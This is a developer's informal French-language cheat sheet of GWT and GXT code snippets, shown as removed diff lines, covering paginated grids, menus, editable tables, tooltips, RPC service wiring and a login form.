-                            pour recuperer dynamiquement une classe: ( je ne vois pas trop l'interet du truc)
-                            				interface Resources extends ClientBundle {
-                            				  Resources INSTANCE = GWT.create(Resources.class);
-                            				
-                            				  @ClassType(SomeClass.class)
-                            				  GwtCreateResource<ReturnType> factory();
-                            				}
-                            				
-                            				// Elsewhere
-                            				ReturnType obj = Resources.INSTANCE.factory().create();
-                            */
-   
-GXT :
-pagination sur un grid:
-      RpcProxy proxy = new RpcProxy()
-       {
-          protected void load(Object o, AsyncCallback asyncCallback)
-          {
-              serviceStorage.getServiceStorageList((PagingLoadConfig)o, asyncCallback); // dans mon bablaServiceAsync j'ai: void getServiceStorageList(PagingLoadConfig config, AsyncCallback<PagingLoadResult<WECM53_STORAGE_CONTROL>> asyncCallback) throws IllegalArgumentException;
-          }
-        };
-          final PagingLoader<PagingLoadResult<WECM55_STORAGE_IAO_CONTROL>> loader = new BasePagingLoader<PagingLoadResult<WECM55_STORAGE_IAO_CONTROL>>(proxy);
-	       private ListStore<WECM55_STORAGE_IAO_CONTROL> store= new ListStore<WECM55_STORAGE_IAO_CONTROL>(loader);
-	       ColumnModel cm;	
-	       protected Grid<WECM55_STORAGE_IAO_CONTROL> grid =new EditorGrid<WECM55_STORAGE_IAO_CONTROL>(store, cm);
-	       	final PagingToolBar bar = new PagingToolBar(9);
-        public void init(final WecApp wecApp) 
-      	{
-      	 // sert à savoir quand le chargement est termine mais c facultatif: c pour mon petit bandeau chargement
-      		LoadListener ll = new LoadListener()
-      		{
-      		@Override
-      			public void handleEvent(LoadEvent e) 
-      		{
-      				wecApp.chargement.hide();
-      			}	
-      		};
-         		loader.setRemoteSort(true);
-      	 		loader.addLoadListener(ll
-      	 		bar.bind(loader);
-          	buildInterface(); // ma methode pour construire toutes mes colonnes
-          		wecApp.hc.add(cp, "td.centercenter");
-          		loader.load();
-          }	
-	
-pour qu'un element soit draguable et fermable l'inclure dans un objet Dialog
-	    Dialog complex = new Dialog();
-	    complex.setBodyBorder(false);  
-				complex.setWidth(900);  
-				complex.setHeading(wectemplate.getWEC51_NOM().concat(": "+result.length + " champs"));
-			    complex.setHeight(600);
-			    complex.setScrollMode(Scroll.AUTOY);
-			    complex.setHideOnButtonClick(true);  
-			    complex.setBottomComponent(null);
-			    BorderLayout layout = new BorderLayout();  
-			    complex.setLayout(layout);
-	    complex.add(addForm);
-	    complex.scrollIntoView(addForm);
-Dans la classe d'un bouton qui lui meme est dans une classe parent, pour faire reference à cette classe parente mere du bouton:
-    WecM55StorageIAOControlTable.this.displayAddForm();
-Pour empecher le scroll sur une page:
-  <body style="overflow:scroll; width:100%; position: fixed;">
-pour mettre un scrollbar vertical ou horizontal: 
-        tradForm.setScrollMode(Scroll.AUTOY);
-pour debugger debuger voir dans gwt:
-pour faire un message de confirmation sur l'appui d'un bouton ou autre:
-     		Button insert = new Button("blah",   new SelectionListener<ButtonEvent>()  
-     {  
-	          @Override
-	             public void componentSelected(ButtonEvent ce) 
-	             {
-	        	  	   MessageBox.confirm("Confirm", "Sure?", new Listener<MessageBoxEvent>()
-	        				{
-        	    				public void handleEvent(MessageBoxEvent be) 
-        	    				{
-                          if (!be.getButtonClicked().getText().equals("No"))
-		    					       {
-        	    					 ...
-        	    					}
-        	    				}
-	    			      });
-	    		  
-				      }
-				});
-        
-classe utility
-                                            package com.application.goameg.client.utilities;
-                                            
-                                            import java.util.ArrayList;
-                                            import java.util.List;
-                                            
-                                            import com.application.goameg.client.Constants;
-                                            import com.extjs.gxt.ui.client.data.ModelType;
-                                            import com.extjs.gxt.ui.client.widget.grid.ColumnConfig;
-                                            import com.extjs.gxt.ui.client.widget.grid.ColumnModel;
-                                            import com.google.gwt.json.client.JSONArray;
-                                            import com.google.gwt.json.client.JSONParser;
-                                            import com.google.gwt.json.client.JSONValue;
-                                            
-                                            public class Utility {
-                                            
-                                            	public static ModelType getGenerateModelTypeFromQuey(String sqlQuery) {
-                                            		sqlQuery = sqlQuery.toUpperCase();
-                                            		int from = sqlQuery.indexOf("FROM");
-                                            		int select = sqlQuery.indexOf("SELECT")+6;
-                                            		String columns = sqlQuery.substring(select, from);
-                                            		String[] split = columns.split(",");
-                                            		ModelType type = new ModelType();
-                                            		type.setRoot("records");
-                                            		type.setTotalName("totalCount");// important. Is used by the pagination tool. (pfff ca c vieux! ou bien c du json)
-                                            		type.addField("RNUM","RNUM");
-                                            		for (int i = 0; i < split.length; i++) {
-                                            			type.addField(split[i].trim().toUpperCase(),split[i].trim().toUpperCase());
-                                            			}
-                                            		//Log.debug(type.getField("FWS99IDLBL").getName());
-                                            		return type;
-                                            	}
-                                            	public static ModelType getGenerateModelType() {
-                                            		return null;
-                                            	}
-                                            	
-                                            	public static ColumnModel getGenerateColumnModelFromJSONString(String columns) {
-                                            		JSONValue jv = JSONParser.parse(columns);
-                                            		JSONArray jva = jv.isArray();
-                                            		List<ColumnConfig> cols = new ArrayList<ColumnConfig>();
-                                            		for (int i =0; i<jva.size(); i++)
-                                            		{
-                                            		int size = Integer.parseInt(jva.get(i).isArray().get(2).isNumber().toString())*10;
-                                            		
-                                            		ColumnConfig cc = new ColumnConfig(jva.get(i).isArray().get(0).isString().stringValue(), jva.get(i).isArray().get(1).isString().stringValue(),size);
-                                            		cc.setMenuDisabled(true);
-                                            		cc.setWidth(50);
-                                            		cc.setSortable(false);
-                                            		cols.add(cc);
-                                            		}
-                                            		ColumnModel cm = new ColumnModel(cols);
-                                            		
-                                            		return cm;
-                                            	}
-                                            	public static ColumnModel getGenerateColumnModel() {
-                                            		String columns = "merd";
-                                            		JSONValue jv = JSONParser.parse(columns);
-                                            		JSONArray jva = jv.isArray();
-                                            		List<ColumnConfig> cols = new ArrayList<ColumnConfig>();
-                                            		for (int i =0; i<jva.size(); i++)
-                                            		{
-                                            		int size = Integer.parseInt(jva.get(i).isArray().get(2).isNumber().toString())*10;
-                                            		
-                                            		ColumnConfig cc = new ColumnConfig(jva.get(i).isArray().get(0).isString().stringValue(), jva.get(i).isArray().get(1).isString().stringValue(),size);
-                                            		cc.setMenuDisabled(true);
-                                            		cc.setWidth(50);
-                                            		cc.setSortable(false);
-                                            		cols.add(cc);
-                                            		}
-                                            		ColumnModel cm = new ColumnModel(cols);
-                                            		
-                                            		return cm;
-                                            	}
-                                            	/**
-                                            	   * Redirect to URL, changing by the windows .location
-                                            	   * @param url The new URL who remplace the current like http://www.gwt.com/
-                                            	   */  
-                                            	   public  static native void windowLocation(String url)/*-{
-                                            		$wnd.location = url;
-                                            	  }-*/;	  
-                                            
-                                            	  /**
-                                            	   * Open new (tab) browser to URL, open with window.open() 
-                                            	   * @param url The new URL to open like http://www.gwt.com/
-                                            	   */
-                                            	  public static native void windowOpen(String url)/*-{
-                                            			$wnd.open(url);
-                                            	  }-*/;
-                                            
-                                            	   /**
-                                            	   * Redirige la page en cours vers la nouvelle URL
-                                            	   * @param url L'url qui remplacera l'actuelle
-                                            	   */ 
-                                            	  public static void pageRediriger(String url)
-                                            	  {
-                                            		  windowLocation(url); // plutot: Window.Location.assign("http://www.wenhuaduverge.com/shop/");
-                                            	  }	 
-                                            
-                                            	  /**
-                                            	   * Ouvre dans le navigateur, une nouvelle page ou onglet a destination de URL
-                                            	   * @param url L'url a ouvrir dans un nouvel onglet ou un nouveau navigateur
-                                            	   */
-                                            	  public static void pageOuvrir(String url)
-                                            	  {
-                                            		  windowOpen(url);
-                                            	  }
-                                            
-                                            }
-
-pour faire un menu:
-        bar = new MenuBar(); // c'est la ligne de base horizontale
-        bar.setBorders(false);
-        bar.setStyleName("menu");
-        Menu menu = new Menu(); // c'est une ligne verticale  
-		     MenuItem item1 = new MenuItem("New");      // c'est un element de la ligne verticale
-		     item1.addListener(Events.Select, new Listener<ComponentEvent>() {  
-		          	        public void handleEvent(ComponentEvent be) {  menu.add(item1);  
-		           	          wecApp.loadOnglets();MenuItem item2 = new MenuItem("Open File");  
-		           	        wecApp.loadTemplates();menu.add(item2);  
-		           	        wecApp.loadServices();  Menu sub = new Menu();                    
-		           	          }});
-          sub.add(new MenuItem("readme.txt"));  
-		     sub.add(new MenuItem("helloworld.txt"));  
-		     item2.setSubMenu(sub);                    // menu > menuItem > menu > menuItem etc.
- 
-		     bar.add(new MenuBarItem("File", menu)); //MenuBar(Menu(MenuItems(Menu(MenuItems)))
-
-		     Menu sub2 = new Menu();  
-		     sub2.add(new MenuItem("Cut"));  
-		     sub2.add(new MenuItem("Copy"));  
-		     MenuBarItem edit = new MenuBarItem("Edit", sub2);  
-		     bar.add(edit);  
-		     sub = new Menu();  
-		     sub.add(new MenuItem("Search"));  
-		     sub.add(new MenuItem("File"));  
-		     sub.add(new MenuItem("Java"));  
-		     MenuBarItem item3 = new MenuBarItem("Search", sub);  
-		     bar.add(item3);  
-		     menu = new Menu();  
-		     CheckMenuItem menuItem = new CheckMenuItem("I Like Cats");  
-		     menuItem.setChecked(true);  
-		     menu.add(menuItem);  
-		     menuItem = new CheckMenuItem("I Like Dogs");  
-		     menu.add(menuItem);  
-		     menu.add(new SeparatorMenuItem());  
-		     MenuItem radios = new MenuItem("Radio Options");  
-		     menu.add(radios);  
-		     Menu radioMenu = new Menu();  
-		     CheckMenuItem r = new CheckMenuItem("Blue Theme");  
-		     r.setGroup("radios");  
-		     r.setChecked(true);  
-		     radioMenu.add(r);  
-		     r = new CheckMenuItem("Gray Theme");  
-		     r.setGroup("radios");  
-		     radioMenu.add(r);  
-		     radios.setSubMenu(radioMenu);  
-		     MenuItem date = new MenuItem("Choose a Date");  
-		     date.setIcon(AbstractImagePrototype.create(resources.logo()));  
-		     menu.add(date);  
-		     date.setSubMenu(new DateMenu());  
-		     MenuBarItem item4 = new MenuBarItem("Foo", menu);  
-		     bar.add(item4);  
-
-pour faire un tableau
-                                  private ListStore<WEC56_M_VALPHASE> store= new ListStore<WEC56_M_VALPHASE>();
-                                  private WEC51_M_TEMPLATEServiceAsync templateServiceValPhase = GWT.create(WEC51_M_TEMPLATEService.class);
-                                  
-                                  templateServiceValPhase.getValphaseFromTemplate(f,new AsyncCallback<WEC56_M_VALPHASE[]>() 
-                            	    {
-                                    	public void onFailure(Throwable caught) 
-                            			   {
-                            				    wecAppEntry.chargement.hide();
-                            					   MessageBox.alert("Result", "Failure"+ caught, null);
-                            			   }
-                            			   @Override
-			                         			public void onSuccess(WEC55_D_VALCHM[] result) 
-                              			{
-                              							List<ColumnConfig> configs = new ArrayList<ColumnConfig>();
-                                      				ColumnConfig column1 = new ColumnConfig();  
-                                                    column1.setId(WECM53_STORAGE_CONTROL.CSIA);  
-                                                    column1.setHeader("Sia");  
-                                                    column1.setWidth(60);
-                                                    configs.add(column1); 
-                                                    ColumnConfig column2 = new ColumnConfig();  
-                                                    column2.setId(WECM53_STORAGE_CONTROL.CSIA);  
-                                                    column2.setHeader("Sia");  
-                                                    column2.setWidth(60);
-                                                    configs.add(column2);
-                                              (...) 
-                              				ColumnModel cm = new ColumnModel(configs);
-                              				store.add(Arrays.asList(result));
-                              				grid = new Grid<WEC55_D_VALCHM>(store, cm);
-						                          grid.setBorders(true);
-						                          grid.setSize(800, 200);
-                              				cp = new ContentPanel();  
-                              				 cp.setBodyBorder(false);  
-                              			      cp.setHeading("Valeurs");  
-                              			      cp.setButtonAlign(HorizontalAlignment.CENTER);  
-                              			        
-                              			      cp.setSize(800, 700);
-                              			    cp.add(grid);
-pour avoir la barre de defilement verticale dans un tableau: scrollbar
-        cp.setSize(600, 700); le cp qui contient le tableau doit avoir un width un peu plus petit... chais pas pourquoi. Ici ci c 800 ca marche pas. Ca marche si c 600
-pour faire des drag and drop dans un meme tableau rajouter ca: 
-         new GridDragSource(grid);  
-         GridDropTarget target = new GridDropTarget(grid);  
-         target.setAllowSelfAsSource(true);  
-         target.setFeedback(Feedback.INSERT);  
-         
-pour ajouter un bouton en bas au tableau:
-              contentPannel.add(grid);
-              contentPannel.addButton(monbouton);
-pour faire un tableau editable (facon excell ou avec des cellules en select ou en texte saisissable):
-          ne pas utiliser Grid mais EditorGrid et pour la colonne qu'on veut rendre editable faire: (ca executera automatiquement au changement la metode 	public <X> X set(String property, X value) { de mon model.)
-          // sinon c'est nouveau on peut aussi utiliser la classe RowEditor mais j'ai pas d'exemple dessus... ca a l'air tres tres bien 
-          (exemple combo box select: )
-                      final SimpleComboBox<String> combo = new SimpleComboBox<String>();  
-                      combo.setForceSelection(true);  
-                      combo.setTriggerAction(TriggerAction.ALL);  
-                      combo.add("ON");
-                      combo.add("OFF");  
-                      //combo.setDisplayField(WEC51_M_TEMPLATE.ACTIVE);
-                      CellEditor editor = new CellEditor(combo) {
-                
-                    	  @Override  
-                          public Object preProcessValue(Object value) {  
-                            if (value == null) {  
-                              return value;  
-                            }  
-                            return combo.findModel(value.toString());  
-                          }  
-                      
-                          @Override  
-                          public Object postProcessValue(Object value) {  
-                            if (value == null) {  
-                              return value;  
-                            }  
-                            return ((ModelData) value).get("value");  
-                          }  
-                      };
-                      column = new ColumnConfig();  
-                      column.setId(WEC51_M_TEMPLATE.ACTIVE);  
-                      column.setHeader("Active");  
-                      column.setWidth(60);
-                      column.setEditor(editor);
-                      configs.add(column); // c'est List<ColumnConfig> configs = new ArrayList<ColumnConfig>();
-          exemple texte:
-                TextField<String> text = new TextField<String>();  
-                text.setAllowBlank(true);  
-                column = new ColumnConfig();
-                column.setEditor(new CellEditor(text));
-                column.setId(WEC51_M_TEMPLATE.NOM);  
-                column.setHeader("Nom");  
-                column.setWidth(100);  
-                //column.setRenderer(buttonRenderer);  
-                configs.add(column); // C'est List<ColumnConfig> configs = new ArrayList<ColumnConfig>();  
-      (...)
-      ensuite rajouter un bouton à mon contentpanel en bas qui contient mon grid qui fera ca: 
-                            saveBt = new Button("Sauver", new SelectionListener<ButtonEvent>() 
-                         	    	 {  
-                       			       public void componentSelected(ButtonEvent ce) 
-                       			       {
-                       			    	   store.commitChanges(); // store c'est le liststore qui est declare dans le grid
-                                              WEC51_M_TEMPLATEServiceAsync templateService = GWT.create(WEC51_M_TEMPLATEService.class);
-                                              templateService.updateTemplateList(store.getModels(),new AsyncCallback<WEC51_M_TEMPLATE[]>() 
-                                     	    		{
-                                     	    			public void onFailure(Throwable caught) 
-                                     	    			{
-                                     	    					// Show the RPC error message to the user
-                                     	    					MessageBox.alert("Result", "Failure"+ caught, null);
-                                     	    			}
-                                           			@Override
-                                           			public void onSuccess(WEC51_M_TEMPLATE[] result) 
-                                           			{
-                                           				MessageBox.alert("Result", "ok", null);
-                                           			}
-                                     	           });
-                       			    	}
-                       			    	   public void onFailure(Throwable caught) 
-                            	    			{
-                            	    					MessageBox.alert("Result", "Failure"+ caught, null);
-                            	    			}
-                      			       });
-                           
-        pour mettre un bouton ou n'importe quoi à chaque ligne de mon grid: 
-                            GridCellRenderer<WEC51_M_TEMPLATE> buttonRenderer = new GridCellRenderer<WEC51_M_TEMPLATE>() 
-                          {  
-                              private boolean init;  
-                              public Object render(final WEC51_M_TEMPLATE model, String nomMisDansColumnSetId, ColumnData config, final int rowIndex, final int colIndex, ListStore<WEC51_M_TEMPLATE> store, Grid<WEC51_M_TEMPLATE> grid) 
-                              {  
-                                Button b = new Button((String) model.get(nomMisDansColumnSetId), new SelectionListener<ButtonEvent>() 
-                                {  
-                                  @Override  
-                                  public void componentSelected(ButtonEvent ce) 
-                                  {  
-                                    Info.display(model.getWEC51_NOM(), "<ul><li>" + model.getWEC51_CLASS() + "</li></ul>"); // aussi utiliser &bull; ou &#9632;  
-                                  }  
-                                });  
-                                //b.setWidth(grid.getColumnModel().getColumnWidth(colIndex) - 10);  
-                                b.setToolTip("Cliquer pour copier complettement ce composant");  
-                                return b;  
-                              }  
-                            };  
-                          
-                          ColumnConfig column = new ColumnConfig();  
-                          column.setHeader("Copier"); 
-                          column.setId("cp");
-                          column.setWidth(60);
-                          column.setRenderer(buttonRenderer);
-                          configs.add(column);// c'est List<ColumnConfig> configs = new ArrayList<ColumnConfig>();
-                                                                 
-pour faire un textarea:
-    TextArea field = new TextArea();
-pour faire des onglets: 
-                                  TabPanel folder = new TabPanel();  
-                            	    folder.setWidth(450);  
-                            	    folder.setAutoHeight(true);  
-                            	  
-                            	    TabItem infrastructure = new TabItem("Infrastructure");  
-                            	    //shortText.addStyleName("pad-text");  
-                            	    infrastructure.add(null); // ici je mets le widget que je veux  
-                            	    folder.add(infrastructure);
-                                  // pour que quand je clique sur l'onglet un code s'execute:  
-                                      infrastructure.addListener(Events.Select, new Listener<ComponentEvent>() {  
-                            	        public void handleEvent(ComponentEvent be) {  
-                            	          loadTemplates();  
-                            	          }});
-                                    
-                                                           	  
-                            	    TabItem services = new TabItem("Services");  
-                            	    //longText.addStyleName("pad-text");  
-                            	    services.add(null);  // ici je mets le widget que je veux
-                            	    folder.add(services);
-                            	    hc.add(folder, "td.centercenter");
-si j'ai l'erreur: Service implementation URL not specified ou bien l'erreur Failurecom.google.gwt.user.client.rpc.IncompatibleRemoteServiceException: This application is out of date, please click the refresh button on your browser. ( Blocked attempt to access interface 'com.renault.wec.client.services.WEC71_M_SCEService', which is not implemented by 'com.renault.wec.server.WEC51_M_TEMPLATEServiceImpl'; this is either misconfiguration or a hack attempt )
-        verifier mon web.xml il doit y avoir une servlet du meme nom toto que 
-        ce qui ya dans ma classe de service 
-        @RemoteServiceRelativePath("toto")
-pour faire des boutons pour chaque ligne comme des checkboxes: (on est en train de looper sur un result[] avec i++) 
-                Button enableDisable = new Button("Activer/Desactiver", new SelectionListener<ButtonEvent>() 
-      	    	    	 {  
-            			       public void componentSelected(ButtonEvent ce) 
-            			       {
-            			    	   WEC52_M_CHAMPS f = (WEC52_M_CHAMPS)ce.getButton().getData("field");
-            			    	   MessageBox.alert("Result", "I clicked on "+ f.getWEC52_NOM(), null);
-            			    	   }
-            			    	   public void onFailure(Throwable caught) 
-                 	    			{
-                 	    					MessageBox.alert("Result", "Failure"+ caught, null);
-                 	    			}
-                       			@Override
-                       			public void onSuccess(WEC52_M_CHAMPS result) 
-                       			{
-                       				Widget f = (Widget)ce.getButton().getData("widgetField");
-                       				if (result.getWEC52_FORMCLIEN().startsWith("ex"))
-                       				{
-                    	    				f.setStyleName("x-item-disabled");
-                       				}
-                       			}
-            			    	   
-         			       }});
-                	    	  enableDisable.setData("field", result[i]);
-                       	 enableDisable.setData("widgetField", widgetField);
-             	 widgetField.add(enableDisable);
-  	  
-pour ajouter des checkboxe à chaque ligne du tableau: 
-        // add checkboxes
-        				final CheckBoxSelectionModel<ModelData> sm = new CheckBoxSelectionModel<ModelData>();
-        				sm.setSelectionMode(SelectionMode.MULTI);
-        				sm.addSelectionChangedListener(new SelectionChangedListener<ModelData>()
-        						{
-        					@Override
-        					public void selectionChanged(SelectionChangedEvent<ModelData> se) {
-        						for (ModelData md:se.getSelection())
-        						{
-        							Log.debug(md.get(type.getField(0).getName()).toString());
-        						}
-        		
-        					}
-        						});
-        				cm.getColumns().add(0, sm.getColumn());
-        				grid.addPlugin(sm);
-        				grid.setSelectionModel(sm);
-        		      	    	  
-	    	 
-  pour faire une infobulle sur in widget: 
-    monwidget.setTitle("blah");
-pour faire une infobulle de type tooltip plus perfectionnee:
-        pour que cette tooltip n'aie qu'une seule instance il faut que sa variable soit globale dans la classe (instances multiples) 
-                  btn = new Button("Closable");  
-                  ToolTipConfig config = new ToolTipConfig();  
-                  config.setTitle("Information");  
-                  config.setText("Prints the current document"); on peut y mettre du html avec tables et tout  
-                  config.setCloseable(true);  
-                  btn.setToolTip(config);  
-                  hp.add(btn);  
-                
-                  btn = new Button("Mouse Tracking");  
-                  config = new ToolTipConfig();  
-                  config.setTitle("Information");  
-                  config.setText("Prints the current document"); on peut y mettre du html avec tables et tout    
-                  config.setTrackMouse(true);  
-                  btn.setToolTip(config);  
-                  hp.add(btn);  
-                
-                  btn = new Button("Anchor");  
-                  config = new ToolTipConfig();  
-                  config.setTitle("Information");  
-                  config.setText("Prints the current document"); on peut y mettre du html avec tables et tout    
-                  config.setMouseOffset(new int[] {0, 0});  
-                  config.setAnchor("left");  
-                  btn.setToolTip(config);  
-                  hp.add(btn);  
-                
-                  btn = new Button("Custom");  
-                  config = new ToolTipConfig();  
-                  config.setText("Prints the current document"); on peut y mettre du html avec tables et tout    
-                  config.setTitle("Template Tip");  
-                  config.setMouseOffset(new int[] {0, 0});  
-                  config.setAnchor("left");  
-                  config.setTemplate(new Template(getTemplate(GWT.getHostPageBaseURL())));  
-                  config.setCloseable(true);  
-                  config.setMaxWidth(415);  
-                  btn.setToolTip(config);  
-pour setter un style à un element: 
-    t2.setStyleName("x-menu-text"); ou dans le css il y a ecrit:
-              .x-menu-text {
-                ... etc...
-pour faire appel a un service:
-        il y a trois classes a faire: templateServiceAsync(sous client), templateService(sous client), templateServiceImpl(sous server)
-                 templateServiceAsync = 
-                                          public interface TemplateServiceAsync {
-                                          void getTemplateById(String type, AsyncCallback<WEC53_D_CMPDMD> callback)   throws IllegalArgumentException;
-                                          void getTemplateList(AsyncCallback<WEC51_M_TEMPLATE[]> callback)   throws IllegalArgumentException;
-                 templateService = 
-                                            @RemoteServiceRelativePath("totototo") // attention important: mettre dans le fichier web.xml ce qui correspond. voir:-)
-                                            public interface TemplateService extends RemoteService {
-                                            WEC53_D_CMPDMD getTemplateById(String type) throws IllegalArgumentException;
-                                            WEC51_M_TEMPLATE[] getTemplateList() throws IllegalArgumentException;(interface de )>templateServiceImpl
-                templateServiceImpl =
-                                            @SuppressWarnings("serial")
-                                            public class TemplateServiceImpl extends RemoteServiceServlet implements  TemplateService  
-                pour appeler ce service du client:                                                    
-                                          au niveau des champs de classe: 
-                                                  private TemplateServiceAsync templateService = GWT.create(TemplateService.class);
-                                          Dans une methode: 
-                                            	    templateService.getTemplateList(new AsyncCallback<WEC51_M_TEMPLATE[]>() 
-                                        	    		{
-                                        	    			public void onFailure(Throwable caught) 
-                                        	    			{
-                                        	    					// Show the RPC error message to the user
-                                        	    					MessageBox.alert("Result", "Failure"+ caught, null);
-                                        	    			}
-                                              			@Override
-                                              			public void onSuccess(WEC51_M_TEMPLATE[] result) 
-                                              			{
-        			                                       ....
-                                              			}
-                                        	           });
-            dans web.xml:-)
-                                                  <servlet>
-                                                    <servlet-name>templateServlet</servlet-name>
-                                                    <servlet-class>com.renault.wec.server.TemplateServiceImpl</servlet-class>
-                                                  </servlet>
-                                                  <servlet-mapping>
-                                                    <servlet-name>templateServlet</servlet-name>
-                                                    <url-pattern>/wecapp/totototo</url-pattern>
-                                                  </servlet-mapping>
-                                                  
-pour faire une popup avec joli message:
-        MessageBox.alert("Result", "blah: " + fe.getResultHtml(), null);
-      on peut aussi faire ca: mais c plus moche 
-          Window.alert("Event Tab Was Selected");
-    on peut faire aussi une progress bar avec: .progress(...)
-pour modifier les styles d'un element: 
-    monObjetGXT
-pour faire un formulaire avec des champs:  Ne pas chercher à utiliser columnlayout (attention c'est galère de faire un formulaire sur plusieurs colonnes et meme de rajouter par exemple un widget à chaque field horizontallement: utiliser htmlContainer dans ce cas mais ca supprimer les fieldlabel ou bien en autre recourt si formulaire dynamique utiliser TableLayout) 
-	 loginForm = new FormPanel();       
-	     loginForm.setHeading(constants.connexion());  
-	     loginForm.setFrame(true);  
-	     loginForm.setWidth(350);
-	     loginForm.setLabelWidth(300);  
-	     loginForm.setAction(GWT.getModuleBaseURL()+"login"); // non je ne fais plus comme ca: voir le bouton "Submit plus bas"
-	     // mais dans ce cas dans web.xml mettre: 
-	                 <servlet-name>loginGXTManagerServlet</servlet-name>
-                    <servlet-class>com.renault.wec.server.Login</servlet-class>
-                  </servlet>
-                  <servlet-mapping>
-                    <servlet-name>loginGXTManagerServlet</servlet-name>
-                    <url-pattern>/wecapp/login</url-pattern>
-                  </servlet-mapping>
-	     //loginForm.setEncoding(FormPanel.Encoding.MULTIPART);
-	     //loginForm.setMethod(FormPanel.Method.GET); // marche pas en mode posts
-	     loginForm.setMethod(FormPanel.Method.POST);
-	     loginForm.addListener(Events.Submit,new Listener<FormEvent>(){ // non je ne fais plus comme ca voir le bouton "submit"
-	    	 public void handleEvent(FormEvent fe){
-	    		 
-	    	 Log.debug(fe.getSource().toString());
-	    	 MessageBox.alert("Result", "Check Forums on how to get an actual result: " + fe.getResultHtml(), null);
-	    	 }
-	    	 });
-	     loginForm.addListener(Events.BeforeSubmit,new Listener<FormEvent>(){ // ne pas utiliser ca plutot voir la bouton "Submit" plus bas
-	    	 public void handleEvent(FormEvent fe)
-	    	 {
-	    	 Log.debug(fe.getSource().toString());
-	    	 }
-	    	 });
-	     FieldSet fieldSetLogin = new FieldSet(); // ne pas utiliser fieldSet mais le form direct. si on veut l'utiliser c mieux de mettre le form complet avec ses champs Dans le fieldset. mais pas les champs dans le fieldset.
-	     fieldSetLogin.setHeading(constants.enterYourUserNameAndPassword());
-	     TextField<String> firstName = new TextField<String>();  
-	     firstName.setFieldLabel("Email"); // n'ecrira rien apres le rendered si n'est pas directement dans un formulaire  
-	     firstName.setName("email");
-	     firstName.setAllowBlank(false);  
-	     firstName.getFocusSupport().setPreviousId(loginForm.getButtonBar().getId());  
-	     fieldSetLogin.add(firstName);  
-	   
-	     TextField<String> email = new TextField<String>();  
-	     email.setFieldLabel("Password"); // n'ecrira rien apres le rendered si n'est pas directement dans un formulaire
-	     email.setName("password");
-	     email.setAllowBlank(false);  
-	     fieldSetLogin.add(email);
-	     // pour faire un bouton parcourir....
-	     FileUploadField file = new FileUploadField();  
-	      file.setAllowBlank(false);  
-	      file.setName("uploadedfile");  
-	      file.setFieldLabel("File"); // n'ecrira rien apres le rendered si n'est pas directement dans un formulaire  
-	      fieldSetLogin.add(file); 
-	 	    loginForm.addListener(Events.BeforeSubmit,new Listener<FormEvent>(){ // ne pas faire ca: voir ce que je fais avec le bouton "Submit" ci dessous
-	    	 public void handleEvent(FormEvent fe)
-	    	 {
-	    	 Log.debug(fe.getSource().toString());
-	    	 }
-	    	 });
-	    	   
-	    Button b = new Button("Submit", new SelectionListener<ButtonEvent>() 
-	    {  
-		       public void componentSelected(ButtonEvent ce) 
-		       {
-		    	   List<Field<?>> fieldListOfWecField = form.getFields();
-						for (Field field:fieldListOfWecField)
-						{
-							Log.debug(field.getName());
-							BaseModelData t = new BaseModelData();
-							if (field.getValue()!=null && !field.getValue().equals("null")) t.set(field.getName(), field.getValue()); // t est un objet serialisable. Attention Field n'est pas serialisable donc il faut passer par cette ligne c oblige
-						}
-						if (fieldListOfWecField.get(0).getName().startsWith("WEC5"))
-						{
-  						WEC51_M_TEMPLATEServiceAsync fieldService = GWT.create(WEC51_M_TEMPLATEServiceAsync.class);
-  						List<WEC51_M_TEMPLATE>  tlist = new ArrayList<WEC51_M_TEMPLATE>();
-  						tlist.add(t);
-                       fieldService.updateTemplateList(tlist,  new AsyncCallback<WEC51_M_TEMPLATE[]>()
-                    		   { 
-              	    			public void onFailure(Throwable caught) 
-              	    			{
-              	    					// Show the RPC error message to the user
-              	    					MessageBox.alert("Result", "Failure"+ caught, null);
-              	    			}
-								@Override
-								public void onSuccess(WEC51_M_TEMPLATE[] result) {
-									wecApp.loadTemplateFormFieldFromTempalte((WEC51_M_TEMPLATE) wecApp.getTemplateModel());
-									
-								}
-              	});
-						}
-					}
-
-		       }  
-	     		);
-	    	 Bouton submit AVANT mais ci dessus c mieux: 
-	 	   b.addListener(Events.OnClick, new Listener<ComponentEvent>() 
-   				{
-   					public void handleEvent(ComponentEvent be) 
-   					{
-   						Log.debug("submit0");
-   						loginForm.submit();
-   						
-   					}
-   				});
-   				loginForm.addListener(Events.Submit,new Listener<FormEvent>(){
-	    	 public void handleEvent(FormEvent fe){
-	    		 
-	    	 Log.debug(fe.getSource().toString());
-	    	 MessageBox.alert("Result", "Check Forums on how to get an actual result: " + fe.getResultHtml(), null);
-	    	 }
-	    	 });
-	 	       loginForm.addButton(b);  
-	 	     Button cancel = new Button("Cancel", new SelectionListener<ButtonEvent>() {  
-			       public void componentSelected(ButtonEvent ce) {
-			    	   goameg.loadChooseContry();
-			       }  
-	 	     		});       
-			       loginForm.addButton(cancel); 
-	     loginForm.add(fieldSetLogin);
-	     loginForm.add(fieldSetSubscribe);	 	
-
-
-pour faire un select combobox dans un formulaire de type standard... c'est pas terrible mais j'ai pas trouve mieux.
-  ListStore<BaseModel> options = new ListStore<BaseModel>();
-	     BaseModel m1= new BaseModel();
-	     m1.set("WEC52_OBLCLIEN","O");
-	     BaseModel m2 = new BaseModel();
-	     m2.set("WEC52_OBLCLIEN","N");
-	     options.add(m1);
-	     options.add(m2); // mes options sont des baseModels	     
-	     final ComboBox<BaseModel> comboObligClien = new ComboBox<BaseModel>(); // voici mon select
-         comboObligClien.setStore(options);  
-         comboObligClien.setWidth(3);
-         comboObligClien.setDisplayField(WEC52_M_CHAMPS.OBLCLIEN); // doit etre un de mes champs de mon model ici en l'occurence le BaseModel
-         comboObligClien.setValueField(WEC52_M_CHAMPS.OBLCLIEN);   // doit etre un de mes champs de mon model ici en l'occurence le BaseModel
-         comboObligClien.setTypeAhead(true);  
-         comboObligClien.setFieldLabel("ObligClien <font class='yellow'>*</font>");
-         comboObligClien.setName("WEC52_OBLCLIEN");
-         comboObligClien.setTriggerAction(TriggerAction.ALL);
-         BaseModel selected = new BaseModel();
-         selected.set("WEC52_OBLCLIEN",wec52_M_CHAMPS.getWEC52_OBLCLIEN());
-         comboObligClien.setValue(selected);
-         ToolTipConfig config2 = new ToolTipConfig();
-         config2.setMinWidth(300);
-         config2.setTitle(TOOLTIPTITLE);
-         config2.setText(TOOLTIPOBLCLIEN);                                      
-         config2.setMouseOffset(new int[] {0, 0});  
-         config2.setAnchor("left");
-         config2.setDismissDelay(0);
-         comboObligClien.setToolTip(config2);
